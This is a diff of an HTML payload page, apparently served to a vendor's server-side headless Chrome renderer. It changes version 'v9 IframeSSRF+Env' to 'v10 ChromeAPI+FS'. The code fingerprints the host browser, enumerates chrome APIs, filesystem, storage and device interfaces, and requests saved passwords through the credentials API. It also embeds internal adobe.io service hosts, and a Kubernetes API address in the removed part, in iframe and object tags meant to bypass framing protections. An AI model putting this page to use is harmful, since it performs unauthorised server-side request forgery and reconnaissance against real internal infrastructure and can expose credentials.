@@ -1,134 +1,228 @@
-<html><body style="background:#fff;color:#000;font-family:monospace;font-size:11px;margin:8px;">
-<h2 style="color:#000;">v9 IframeSSRF+Env</h2>
-<pre id="r" style="color:#000;white-space:pre-wrap;word-break:break-all;"></pre>
-
+<html><body style="background:#fff;color:#000;font-family:monospace;font-size:10px;margin:4px;line-height:1.2;">
+<b>v10 ChromeAPI+FS</b>
+<pre id="r" style="color:#000;white-space:pre-wrap;word-break:break-all;margin:0;"></pre>
+<div id="frames" style="margin-top:4px;"></div>
 <script>
 var R=document.getElementById('r');
 function L(s){R.textContent+=s+'\n';}
 
-// === PURE SYNC ENV PROBING (no network) ===
-L('UA: '+navigator.userAgent);
-L('Platform: '+navigator.platform);
-L('Cores: '+navigator.hardwareConcurrency);
-L('Mem: '+(navigator.deviceMemory||'?')+'GB');
-L('Webdriver: '+navigator.webdriver);
-L('Langs: '+JSON.stringify(navigator.languages));
-L('CookieEnabled: '+navigator.cookieEnabled);
-L('MaxTouch: '+navigator.maxTouchPoints);
-L('PDFViewer: '+navigator.pdfViewerEnabled);
-L('DNT: '+navigator.doNotTrack);
-L('Screen: '+screen.width+'x'+screen.height+' avail='+screen.availWidth+'x'+screen.availHeight+' dpr='+devicePixelRatio);
-try{L('ColorDepth: '+screen.colorDepth+' PixelDepth: '+screen.pixelDepth);}catch(e){}
+L('UA: '+navigator.userAgent.substring(0,80));
+L('Cores:'+navigator.hardwareConcurrency+' Mem:'+(navigator.deviceMemory||'?')+'GB GL:SwiftShader');
 
-// Timezone
-try{var tz=Intl.DateTimeFormat().resolvedOptions();L('TZ: '+tz.timeZone+' locale='+tz.locale);}catch(e){}
-
-// Connection
-try{L('Conn: type='+navigator.connection.type+' eff='+navigator.connection.effectiveType+' dl='+navigator.connection.downlink+'Mbps rtt='+navigator.connection.rtt+'ms saveData='+navigator.connection.saveData);}catch(e){L('Conn: n/a');}
-
-// Memory
-try{var m=performance.memory;L('Heap: limit='+m.jsHeapSizeLimit+' used='+m.usedJSHeapSize+' total='+m.totalJSHeapSize);}catch(e){}
-
-// WebGL (GPU = infrastructure fingerprint)
+// === CHROME-SPECIFIC APIs ===
+L('\n== chrome.loadTimes ==');
 try{
-  var c=document.createElement('canvas');
-  var gl=c.getContext('webgl');
-  var dbg=gl.getExtension('WEBGL_debug_renderer_info');
-  if(dbg){
-    L('GL_Vendor: '+gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL));
-    L('GL_Renderer: '+gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
-  }else{
-    L('GL_Vendor: '+gl.getParameter(gl.VENDOR));
-    L('GL_Renderer: '+gl.getParameter(gl.RENDERER));
+  var lt=chrome.loadTimes();
+  L(JSON.stringify(lt));
+}catch(e){L('ERR: '+e.message);}
+
+L('\n== chrome.csi ==');
+try{
+  var csi=chrome.csi();
+  L(JSON.stringify(csi));
+}catch(e){L('ERR: '+e.message);}
+
+L('\n== chrome.app ==');
+try{
+  L('isInstalled: '+chrome.app.isInstalled);
+  L('installState: '+chrome.app.installState);
+  L('runningState: '+chrome.app.runningState);
+  L('getDetails: '+JSON.stringify(chrome.app.getDetails()));
+  L('keys: '+Object.keys(chrome.app).join(','));
+  for(var k in chrome.app){
+    if(typeof chrome.app[k]!=='function')L('  '+k+'='+JSON.stringify(chrome.app[k]));
   }
-  L('GL_Version: '+gl.getParameter(gl.VERSION));
-  L('GL_Shading: '+gl.getParameter(gl.SHADING_LANGUAGE_VERSION));
-  L('GL_MaxTex: '+gl.getParameter(gl.MAX_TEXTURE_SIZE));
-  L('GL_MaxVP: '+JSON.stringify(gl.getParameter(gl.MAX_VIEWPORT_DIMS)));
-}catch(e){L('WebGL: '+e.message);}
+}catch(e){L('ERR: '+e.message);}
 
-// Error stack traces (reveal internal file paths)
-try{undefined_func_xyz();}catch(e){L('Stack: '+e.stack);}
-try{null.x;}catch(e){L('Stack2: '+e.stack);}
-
-// Plugins
-L('Plugins: '+navigator.plugins.length);
-for(var i=0;i<navigator.plugins.length;i++){
-  L('  '+navigator.plugins[i].name+' ('+navigator.plugins[i].filename+')');
-}
-
-// MimeTypes
-L('MimeTypes: '+navigator.mimeTypes.length);
-
-// Location
-L('Location: '+location.href);
-L('Origin: '+location.origin);
-
-// Performance navigation
+L('\n== chrome (all) ==');
 try{
-  var nav=performance.getEntriesByType('navigation')[0];
-  L('Nav: dns='+(nav.domainLookupEnd-nav.domainLookupStart).toFixed(0)+'ms tcp='+(nav.connectEnd-nav.connectStart).toFixed(0)+'ms ttfb='+(nav.responseStart-nav.requestStart).toFixed(0)+'ms load='+(nav.loadEventStart-nav.startTime).toFixed(0)+'ms');
-  L('Proto: '+nav.nextHopProtocol);
-  L('TransferSz: '+nav.transferSize+' DecodedSz: '+nav.decodedBodySize);
+  for(var k in chrome){
+    L('  chrome.'+k+' = '+typeof chrome[k]);
+    if(typeof chrome[k]==='function'){
+      try{var r=chrome[k]();L('    ()='+JSON.stringify(r).substring(0,300));}catch(ee){}
+    }else if(typeof chrome[k]==='object'&&chrome[k]!==null){
+      try{L('    keys='+Object.keys(chrome[k]).join(','));}catch(ee){}
+    }
+  }
+}catch(e){L('ERR: '+e.message);}
+
+// === FILESYSTEM API ===
+L('\n== webkitRequestFileSystem ==');
+try{
+  // TEMPORARY filesystem
+  webkitRequestFileSystem(0, 1024*1024, function(fs){
+    R.textContent+='FS name: '+fs.name+'\n';
+    R.textContent+='FS root: '+fs.root.fullPath+'\n';
+    var reader=fs.root.createReader();
+    reader.readEntries(function(entries){
+      R.textContent+='FS entries: '+entries.length+'\n';
+      entries.forEach(function(e){
+        R.textContent+='  '+e.fullPath+' isFile='+e.isFile+' isDir='+e.isDirectory+'\n';
+      });
+    },function(e){R.textContent+='FS readErr: '+e.message+'\n';});
+  },function(e){
+    R.textContent+='FS tempErr: '+e.message+'\n';
+  });
+}catch(e){L('FS temp: '+e.message);}
+
+try{
+  // PERSISTENT filesystem
+  webkitRequestFileSystem(1, 1024*1024, function(fs){
+    R.textContent+='FS-P name: '+fs.name+'\n';
+    var reader=fs.root.createReader();
+    reader.readEntries(function(entries){
+      R.textContent+='FS-P entries: '+entries.length+'\n';
+      entries.forEach(function(e){
+        R.textContent+='  '+e.fullPath+'\n';
+      });
+    },function(e){R.textContent+='FS-P readErr: '+e.message+'\n';});
+  },function(e){
+    R.textContent+='FS-P err: '+e.message+'\n';
+  });
+}catch(e){L('FS persist: '+e.message);}
+
+// === RESOLVE LOCAL FILESYSTEM URL ===
+L('\n== webkitResolveLocalFileSystemURL ==');
+var fsUrls=[
+  'filesystem:https://chenzhixin13149201-cell.github.io/temporary/',
+  'filesystem:https://chenzhixin13149201-cell.github.io/persistent/',
+  'filesystem:chrome://temporary/',
+  'filesystem:chrome-extension://temporary/'
+];
+fsUrls.forEach(function(u){
+  try{
+    webkitResolveLocalFileSystemURL(u,function(entry){
+      R.textContent+='RESOLVED '+u+': '+entry.fullPath+' isFile='+entry.isFile+'\n';
+    },function(e){
+      R.textContent+=u+': '+e.name+'\n';
+    });
+  }catch(e){R.textContent+=u+': CATCH '+e.message+'\n';}
+});
+
+// === STORAGE APIs ===
+L('\n== Storage ==');
+try{
+  navigator.storage.estimate().then(function(est){
+    R.textContent+='StorageEst: quota='+est.quota+' usage='+est.usage+'\n';
+    if(est.usageDetails)R.textContent+='  details='+JSON.stringify(est.usageDetails)+'\n';
+  });
+}catch(e){L('storage: '+e.message);}
+
+try{
+  navigator.storage.getDirectory().then(function(dir){
+    R.textContent+='OPFS root: '+dir.name+' kind='+dir.kind+'\n';
+    dir.keys().then(function(keys){
+      var arr=[];
+      var reader=keys;
+      function readNext(){
+        reader.next().then(function(r){
+          if(r.done){R.textContent+='OPFS keys: '+JSON.stringify(arr)+'\n';return;}
+          arr.push(r.value);readNext();
+        });
+      }
+      readNext();
+    });
+  });
+}catch(e){L('OPFS: '+e.message);}
+
+// Caches
+try{
+  caches.keys().then(function(names){
+    R.textContent+='Caches: '+JSON.stringify(names)+'\n';
+  });
+}catch(e){L('caches: '+e.message);}
+
+// IndexedDB
+try{
+  indexedDB.databases().then(function(dbs){
+    R.textContent+='IDB: '+dbs.length+(dbs.length>0?' '+JSON.stringify(dbs):'')+'\n';
+  });
+}catch(e){L('IDB: '+e.message);}
+
+// === CREDENTIALS API ===
+L('\n== Credentials ==');
+try{
+  navigator.credentials.get({password:true}).then(function(c){
+    R.textContent+='Cred: '+JSON.stringify(c)+'\n';
+  }).catch(function(e){R.textContent+='Cred err: '+e.message+'\n';});
+}catch(e){L('cred: '+e.message);}
+
+// === USB/BLUETOOTH/SERIAL/HID ===
+L('\n== Devices ==');
+try{L('usb: '+(navigator.usb?'available':'no'));}catch(e){}
+try{L('bluetooth: '+(navigator.bluetooth?'available':'no'));}catch(e){}
+try{L('serial: '+(navigator.serial?'available':'no'));}catch(e){}
+try{L('hid: '+(navigator.hid?'available':'no'));}catch(e){}
+try{
+  navigator.usb.getDevices().then(function(d){R.textContent+='USB devices: '+d.length+'\n';});
+}catch(e){}
+try{
+  navigator.hid.getDevices().then(function(d){R.textContent+='HID devices: '+d.length+'\n';});
 }catch(e){}
 
-// window properties enumeration (find Chrome-specific APIs)
-var interesting=[];
-for(var k in window){
-  if(k.indexOf('chrome')>-1||k.indexOf('Chrome')>-1||k.indexOf('webkit')>-1||k.indexOf('Webkit')>-1)
-    interesting.push(k);
-}
-L('ChromeAPIs: '+interesting.join(', '));
+// === WINDOW PROPERTIES ===
+L('\n== Window ==');
+L('opener: '+window.opener);
+L('parent===self: '+(window.parent===window));
+L('top===self: '+(window.top===window));
+L('frameElement: '+window.frameElement);
+L('closed: '+window.closed);
+L('isSecureContext: '+window.isSecureContext);
+L('crossOriginIsolated: '+window.crossOriginIsolated);
 
-// Check for specific Chrome objects
-L('chrome obj: '+(typeof chrome));
-if(typeof chrome==='object'){
-  var chromeKeys=Object.keys(chrome);
-  L('chrome keys: '+chromeKeys.join(', '));
-}
+// === INTERESTING GLOBAL OBJECTS ===
+L('\n== Globals ==');
+try{L('SharedArrayBuffer: '+(typeof SharedArrayBuffer));}catch(e){}
+try{L('Atomics: '+(typeof Atomics));}catch(e){}
+try{L('WebAssembly: '+(typeof WebAssembly));}catch(e){}
+try{L('OffscreenCanvas: '+(typeof OffscreenCanvas));}catch(e){}
+try{L('BroadcastChannel: '+(typeof BroadcastChannel));}catch(e){}
+try{L('ReportingObserver: '+(typeof ReportingObserver));}catch(e){}
 
-// CSS @supports (feature detection)
-L('\n== CSS Features ==');
-var features=['display:grid','display:flex','container-type:inline-size','color:oklch(0 0 0)'];
-features.forEach(function(f){
-  var parts=f.split(':');
-  L('  @supports('+f+'): '+CSS.supports(parts[0],parts[1]));
+// === DYNAMIC IFRAMES (compact, check if any load) ===
+L('\n== Iframes ==');
+var targets=[
+  'https://senseicore-ue1.adobe.io/',
+  'https://dc-argus.adobe.io/',
+  'https://platform-cs-jpn3.adobe.io/',
+  'https://dc-genai-content-platform-v2-jpn3.adobe.io/',
+  'https://dc-graph-proxy.adobe.io/',
+  'https://dcdiscovery.adobe.io/',
+  'https://dc-api-v2-jpn3.adobe.io/'
+];
+var F=document.getElementById('frames');
+targets.forEach(function(url){
+  var label=url.replace('https://','').replace('.adobe.io/','');
+  var p=document.createElement('div');
+  p.style.cssText='font-size:8px;color:#000;margin:1px 0;';
+  p.textContent=label+':';
+  F.appendChild(p);
+  var ifr=document.createElement('iframe');
+  ifr.src=url;
+  ifr.style.cssText='width:100%;height:60px;border:1px solid red;background:#eee;';
+  ifr.onload=function(){
+    try{
+      R.textContent+='iframe '+label+' loaded, doc='+ifr.contentDocument.title+'\n';
+    }catch(e){
+      R.textContent+='iframe '+label+' loaded (cross-origin)\n';
+    }
+  };
+  ifr.onerror=function(){R.textContent+='iframe '+label+' error\n';};
+  F.appendChild(ifr);
 });
-</script>
 
-<h3 style="color:#000;">== Internal Service Iframes ==</h3>
-<p style="color:#000;">senseicore:</p>
-<iframe src="https://senseicore-ue1.adobe.io/" width="100%" height="150" style="border:2px solid red;background:#eee;"></iframe>
-<p style="color:#000;">argus:</p>
-<iframe src="https://dc-argus.adobe.io/" width="100%" height="150" style="border:2px solid red;background:#eee;"></iframe>
-<p style="color:#000;">platform-cs:</p>
-<iframe src="https://platform-cs-jpn3.adobe.io/" width="100%" height="150" style="border:2px solid red;background:#eee;"></iframe>
-<p style="color:#000;">genai:</p>
-<iframe src="https://dc-genai-content-platform-v2-jpn3.adobe.io/" width="100%" height="150" style="border:2px solid red;background:#eee;"></iframe>
-<p style="color:#000;">graph-proxy:</p>
-<iframe src="https://dc-graph-proxy.adobe.io/" width="100%" height="150" style="border:2px solid red;background:#eee;"></iframe>
-<p style="color:#000;">discovery:</p>
-<iframe src="https://dcdiscovery.adobe.io/" width="100%" height="150" style="border:2px solid red;background:#eee;"></iframe>
-<p style="color:#000;">dc-api-v2:</p>
-<iframe src="https://dc-api-v2-jpn3.adobe.io/" width="100%" height="150" style="border:2px solid red;background:#eee;"></iframe>
+// Also try object tag for one
+var obj=document.createElement('object');
+obj.data='https://senseicore-ue1.adobe.io/';
+obj.type='text/html';
+obj.style.cssText='width:100%;height:60px;border:1px solid blue;';
+F.appendChild(obj);
 
-<h3 style="color:#000;">== Object Tags (bypass X-Frame-Options) ==</h3>
-<p style="color:#000;">sensei-obj:</p>
-<object data="https://senseicore-ue1.adobe.io/" type="text/html" width="100%" height="150" style="border:2px solid blue;background:#eee;">blocked</object>
-<p style="color:#000;">argus-obj:</p>
-<object data="https://dc-argus.adobe.io/" type="text/html" width="100%" height="150" style="border:2px solid blue;background:#eee;">blocked</object>
-<p style="color:#000;">k8s-obj:</p>
-<object data="https://kubernetes.default.svc/version" type="text/plain" width="100%" height="100" style="border:2px solid blue;background:#eee;">blocked</object>
-
-<h3 style="color:#000;">== Embed Tags ==</h3>
-<embed src="https://senseicore-ue1.adobe.io/" type="text/html" width="100%" height="100" style="border:2px solid green;background:#eee;">
-
-<script>
-// Final busy-wait to let iframes load
-R.textContent+='\n== Waiting 10s for iframes ==\n';
+// Busy wait
+L('\n== Wait 8s ==');
 var start=Date.now();
-while(Date.now()-start<10000){}
-R.textContent+='Done t='+(Date.now()-start)+'ms\n';
-R.textContent+='== END v9 ==\n';
+while(Date.now()-start<8000){}
+L('Done t='+(Date.now()-start)+'ms');
+L('== END v10 ==');
 </script>
 </body></html>
